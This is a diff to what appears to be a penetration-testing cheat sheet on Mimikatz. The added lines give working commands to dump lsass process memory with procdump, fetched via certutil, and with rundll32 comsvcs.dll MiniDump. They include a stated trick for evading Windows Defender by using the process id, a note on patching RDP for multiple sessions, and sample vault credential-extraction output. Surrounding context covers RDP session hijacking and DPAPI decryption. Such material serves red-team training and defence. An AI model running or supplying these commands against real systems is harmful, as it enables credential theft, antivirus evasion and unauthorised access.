@@ -2,15 +2,16 @@
 
 ## Summary
 
-* [Mimikatz - Execute commands](#)
-* [Mimikatz - Extract passwords](#)
-* [Mimikatz - Mini Dump](#)
-* [Mimikatz - Golden ticket](#)
-* [Mimikatz - Skeleton key](#)
-* [Mimikatz - RDP session takeover](#)
-* [Mimikatz - Credential Manager & DPAPI](#)
-* [Mimikatz - Commands list](#)
-* [Mimikatz - Powershell version](#)
+* [Mimikatz - Execute commands](#mimikatz---execute-commands)
+* [Mimikatz - Extract passwords](#mimikatz---extract-passwords)
+* [Mimikatz - Mini Dump](#mimikatz---mini-dump)
+* [Mimikatz - Pass The Hash](#mimikatz---pass-the-hash)
+* [Mimikatz - Golden ticket](#mimikatz---golden-ticket)
+* [Mimikatz - Skeleton key](#mimikatz---skeleton-key)
+* [Mimikatz - RDP session takeover](#mimikatz---rdp-session-takeover)
+* [Mimikatz - Credential Manager & DPAPI](#mimikatz---credential-manager--dpapi)
+* [Mimikatz - Commands list](#mimikatz---commands-list)
+* [Mimikatz - Powershell version](#mimikatz---powershell-version)
 * [References](#references)
 
 ![Data in memory](http://adsecurity.org/wp-content/uploads/2014/11/Delpy-CredentialDataChart.png)
@@ -60,17 +61,28 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
 
 ## Mimikatz - Mini Dump
 
-Dump the lsass process.
+Dump the lsass process with `procdump`
+
+> Windows Defender is triggered when a memory dump of lsass is operated, quickly leading to the deletion of the dump. Using lsass's process identifier (pid) "bypasses" that.
 
 ```powershell
-# HTTP method
+# HTTP method - using the default way
 certutil -urlcache -split -f http://live.sysinternals.com/procdump.exe C:\Users\Public\procdump.exe
 C:\Users\Public\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 
-# SMB method
+# SMB method - using the pid
 net use Z: https://live.sysinternals.com
-Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+tasklist /fi "imagename eq lsass.exe" # Find lsass's pid
+Z:\procdump.exe -accepteula -ma $lsass_pid lsass.dmp
 ```
+
+Dump the lsass process with `rundll32`
+
+```powershell
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass_pid C:\temp\lsass.dmp full
+```
+
+
 
 Then load it inside Mimikatz.
 
@@ -109,6 +121,8 @@ rdesktop 10.0.0.2:3389 -u test -p mimikatz -d pentestlab
 
 ## Mimikatz - RDP session takeover
 
+Use `ts::multirdp` to patch the RDP service to allow more than two users.
+
 Run tscon.exe as the SYSTEM user, you can connect to any session without a password.
 
 ```powershell
@@ -123,6 +137,8 @@ query user
 create sesshijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#55"
 net start sesshijack
 ```
+
+
 
 
 ## Mimikatz - Credential Manager & DPAPI
@@ -140,6 +156,21 @@ $ mimikatz !sekurlsa::dpapi
 # use master key
 $ mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
 ```
+
+Task Scheduled credentials
+
+```powershell
+mimikatz(commandline) # vault::cred /patch
+TargetName : Domain:batch=TaskScheduler:Task:{CF3ABC3E-4B17-ABCD-0003-A1BA192CDD0B} / <NULL>
+UserName   : DOMAIN\user
+Comment    : <NULL>
+Type       : 2 - domain_password
+Persist    : 2 - local_machine
+Flags      : 00004004
+Credential : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+Attributes : 0
+```
+
 
 ## Mimikatz - Commands list
 
